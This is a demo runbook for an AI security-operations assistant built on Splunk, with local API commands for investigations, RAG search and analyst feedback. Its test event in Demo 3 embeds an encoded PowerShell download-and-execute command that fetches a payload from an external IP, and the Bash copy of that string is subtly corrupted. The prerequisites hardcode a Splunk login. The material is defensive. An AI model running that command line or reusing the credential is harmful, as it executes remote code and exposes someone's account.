# Demo Runbook

Step-by-step guide to demonstrate the AI SOC Assistant with RAG memory.

> **IMPORTANT:** Commands are shown for both **PowerShell (Windows)** and **Bash (macOS/Linux)**.
> PowerShell uses `Invoke-RestMethod`, Bash uses `curl`.

---

## Prerequisites Checklist

### PowerShell (Windows)
```powershell
# Check versions
node --version    # Should be 18+
python --version  # Should be 3.10+

# Verify Splunk is running
curl.exe -sk https://localhost:8089/services/server/info -u smalthumkar:Sumal@007

# Install dependencies
cd C:\Users\Suraj\Downloads\splunk_ai_mcp_soc\mcp-connector
npm install

cd C:\Users\Suraj\Downloads\splunk_ai_mcp_soc\soc-agent
pip install -r requirements.txt
```

### Bash (macOS/Linux)
```bash
# Check versions
node --version    # Should be 18+
python3 --version  # Should be 3.10+

# Verify Splunk is running
curl -sk https://localhost:8089/services/server/info -u admin:password

# Install dependencies
cd ~/Downloads/splunk_ai_mcp_soc/mcp-connector
npm install

cd ~/Downloads/splunk_ai_mcp_soc/soc-agent
pip3 install -r requirements.txt
```

---

## Start All Services

### Terminal 1: MCP Connector

**PowerShell:**
```powershell
cd C:\Users\Suraj\Downloads\splunk_ai_mcp_soc\mcp-connector
node index.js
```

**Bash:**
```bash
cd ~/Downloads/splunk_ai_mcp_soc/mcp-connector
node index.js
```

**Expected:** `[+] Server running on port 3000`

### Terminal 2: SOC Agent

**PowerShell:**
```powershell
cd C:\Users\Suraj\Downloads\splunk_ai_mcp_soc\soc-agent
python main.py
```

**Bash:**
```bash
cd ~/Downloads/splunk_ai_mcp_soc/soc-agent
python3 main.py
```

**Expected:** `INFO: Uvicorn running on http://0.0.0.0:8080`

---

## Health Check (All Services)

### PowerShell
```powershell
# Quick health check
Invoke-RestMethod -Uri "http://localhost:3000/health"
Invoke-RestMethod -Uri "http://localhost:8080/health"

# Full system status
Invoke-RestMethod -Uri "http://localhost:8080/api/status/full" | ConvertTo-Json -Depth 5
```

### Bash
```bash
# Quick health check
curl -s http://localhost:3000/health
curl -s http://localhost:8080/health

# Full system status
curl -s http://localhost:8080/api/status/full | python3 -m json.tool
```

**Expected Output:**
```json
{
  "soc_agent": "running",
  "components": {
    "mcp_connector": "running",
    "splunk": "connected"
  },
  "llm": {"enabled": true, "provider": "gemini"},
  "rag": {
    "status": "active",
    "total_documents": 34
  }
}
```

---

## DEMO 1: RAG Status

### PowerShell
```powershell
Invoke-RestMethod -Uri "http://localhost:8080/api/rag/status" | ConvertTo-Json -Depth 3
```

### Bash
```bash
curl -s http://localhost:8080/api/rag/status | python3 -m json.tool
```

**Output:**
```json
{
  "status": "active",
  "collections": {
    "investigations": 3,
    "analyst_feedback": 1,
    "playbooks": 10,
    "mitre_knowledge": 20
  },
  "total_documents": 34
}
```

---

## DEMO 2: RAG Semantic Search

### PowerShell
```powershell
$body = @{
    query = "encoded PowerShell command execution"
    top_k = 3
} | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri "http://localhost:8080/api/rag/search" -ContentType "application/json" -Body $body | ConvertTo-Json -Depth 5
```

### Bash
```bash
curl -s -X POST http://localhost:8080/api/rag/search \
  -H "Content-Type: application/json" \
  -d '{"query": "encoded PowerShell command execution", "top_k": 3}' | python3 -m json.tool
```

**Output shows similar MITRE techniques, playbooks, and past investigations.**

---

## DEMO 3: Full Investigation with RAG

### PowerShell
```powershell
$body = @{
    event_data = @{
        event_type = "process_creation"
        host = "WORKSTATION05"
        user = "jsmith"
        parent_process = "explorer.exe"
        process = "powershell.exe"
        command_line = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
        pid = 4532
        ppid = 2048
        src_ip = "185.220.101.45"
    }
} | ConvertTo-Json -Depth 3

Invoke-RestMethod -Method Post -Uri "http://localhost:8080/api/investigate/comprehensive" -ContentType "application/json" -Body $body | ConvertTo-Json -Depth 10
```

### Bash
```bash
curl -s -X POST http://localhost:8080/api/investigate/comprehensive \
  -H "Content-Type: application/json" \
  -d '{
    "event_data": {
      "event_type": "process_creation",
      "host": "WORKSTATION05",
      "user": "jsmith",
      "parent_process": "explorer.exe",
      "process": "powershell.exe",
      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAcaAdAdAcAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      "pid": 4532,
      "ppid": 2048,
      "src_ip": "185.220.101.45"
    }
  }' | python3 -m json.tool
```

**Watch Terminal 2 for pipeline steps:**
```
Step 1: Querying Splunk MCP for context...
Step 2: Enriching IOCs from threat intel APIs...
Step 3: Researching via web search...
Step 3.5: Retrieving RAG context...
[RAG] Retrieved 12 results across 4 collections
Step 4: Calling Gemini API with RAG-enhanced prompt...
Step 5: Validating key findings...
Investigation complete -> TRUE_POSITIVE, CRITICAL
[RAG] Auto-ingested investigation
```

---

## DEMO 4: RAG Learning Loop

### PowerShell
```powershell
# Step 1: Check current count
(Invoke-RestMethod -Uri "http://localhost:8080/api/rag/status").collections.investigations

# Step 2: Run investigation (above command)

# Step 3: Check count increased
(Invoke-RestMethod -Uri "http://localhost:8080/api/rag/status").collections.investigations
```

### Bash
```bash
# Step 1: Check current count
curl -s http://localhost:8080/api/rag/status | python3 -c "import sys,json; print(json.load(sys.stdin)['collections']['investigations'])"

# Step 2: Run investigation (above command)

# Step 3: Check count increased
curl -s http://localhost:8080/api/rag/status | python3 -c "import sys,json; print(json.load(sys.stdin)['collections']['investigations'])"
```

---

## DEMO 5: Submit Analyst Feedback

### PowerShell
```powershell
$body = @{
    investigation_id = "INV-20260212100001"
    analyst_verdict = "true_positive"
    analyst_notes = "Confirmed malicious. Isolated host and blocked IP."
    analyst_name = "John Smith"
} | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri "http://localhost:8080/api/rag/feedback" -ContentType "application/json" -Body $body
```

### Bash
```bash
curl -s -X POST http://localhost:8080/api/rag/feedback \
  -H "Content-Type: application/json" \
  -d '{
    "investigation_id": "INV-20260212100001",
    "analyst_verdict": "true_positive",
    "analyst_notes": "Confirmed malicious. Isolated host and blocked IP.",
    "analyst_name": "John Smith"
  }' | python3 -m json.tool
```

---

## DEMO 6: MITRE Technique Search

### PowerShell
```powershell
$body = @{
    query = "T1110 brute force credential access"
    top_k = 3
} | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri "http://localhost:8080/api/rag/search" -ContentType "application/json" -Body $body | ConvertTo-Json -Depth 5
```

### Bash
```bash
curl -s -X POST http://localhost:8080/api/rag/search \
  -H "Content-Type: application/json" \
  -d '{"query": "T1110 brute force credential access", "top_k": 3}' | python3 -m json.tool
```

---

## DEMO 7: Re-Bootstrap Knowledge Base

### PowerShell
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8080/api/rag/bootstrap" | ConvertTo-Json
```

### Bash
```bash
curl -s -X POST http://localhost:8080/api/rag/bootstrap | python3 -m json.tool
```

---

## DEMO 8: Natural Language Splunk Query

### PowerShell
```powershell
$body = @{
    question = "Show me all failed login attempts from external IPs"
} | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri "http://localhost:8080/api/splunk-mcp/ask" -ContentType "application/json" -Body $body | ConvertTo-Json -Depth 5
```

### Bash
```bash
curl -s -X POST http://localhost:8080/api/splunk-mcp/ask \
  -H "Content-Type: application/json" \
  -d '{"question": "Show me all failed login attempts from external IPs"}' | python3 -m json.tool
```

---

## DEMO 9: False Positive Detection

### PowerShell
```powershell
$body = @{
    event_data = @{
        event_type = "process_creation"
        host = "ADMIN-PC"
        user = "sysadmin"
        process = "powershell.exe"
        command_line = "powershell.exe Get-Service | Where-Object {`$_.Status -eq 'Running'}"
        parent_process = "explorer.exe"
    }
} | ConvertTo-Json -Depth 3

Invoke-RestMethod -Method Post -Uri "http://localhost:8080/api/investigate/comprehensive" -ContentType "application/json" -Body $body | ConvertTo-Json -Depth 10
```

### Bash
```bash
curl -s -X POST http://localhost:8080/api/investigate/comprehensive \
  -H "Content-Type: application/json" \
  -d '{
    "event_data": {
      "event_type": "process_creation",
      "host": "ADMIN-PC",
      "user": "sysadmin",
      "process": "powershell.exe",
      "command_line": "powershell.exe Get-Service | Where-Object {$_.Status -eq Running}",
      "parent_process": "explorer.exe"
    }
  }' | python3 -m json.tool
```

**Expected: Classification = benign, Severity = low**

---

## Quick Reference Table

| Demo | PowerShell | Bash |
|------|------------|------|
| Health | `Invoke-RestMethod -Uri "http://localhost:8080/health"` | `curl -s http://localhost:8080/health` |
| RAG Status | `Invoke-RestMethod -Uri "http://localhost:8080/api/rag/status"` | `curl -s http://localhost:8080/api/rag/status` |
| Full Status | `Invoke-RestMethod -Uri "http://localhost:8080/api/status/full"` | `curl -s http://localhost:8080/api/status/full` |

---

## Using demo_runner.py (Cross-Platform)

Works on both Windows and macOS/Linux:

```bash
# Run all demos
python demo_runner.py

# Run specific demo
python demo_runner.py comprehensive
python demo_runner.py nlquery
python demo_runner.py enrich
python demo_runner.py falsepositive
```

Results saved to: `demo_results.json`

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `curl` shows HTML in PowerShell | Use `Invoke-RestMethod` instead |
| `Connection refused` | Start all services |
| `RAG status: disabled` | Check `RAG_ENABLED=true` in .env |
| `0 documents` | Run `/api/rag/bootstrap` |
| `Gemini 429` | Wait 1 minute (rate limit) |

---

## PowerShell Tips

1. **Don't use `curl`** - PowerShell aliases `curl` to `Invoke-WebRequest` which has different syntax
2. **Use `Invoke-RestMethod`** - Returns parsed JSON directly
3. **Use `ConvertTo-Json`** - For pretty printing nested objects
4. **Escape `$` in strings** - Use backtick: `` `$_.Status ``

---

*Demo Runbook v2.1 - February 2026*
